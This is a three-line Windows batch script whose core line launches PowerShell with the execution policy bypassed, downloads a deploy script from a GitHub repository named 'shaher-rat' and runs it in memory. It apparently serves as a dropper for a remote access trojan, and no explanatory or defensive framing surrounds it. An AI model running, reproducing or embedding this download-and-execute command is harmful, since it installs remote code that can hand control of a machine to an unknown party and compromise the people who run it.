@echo off
powershell -NoProfile -ExecutionPolicy Bypass -Command "iex ((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/xx21sa/shaher-rat/main/deploy/deploy.ps1'))"
pause
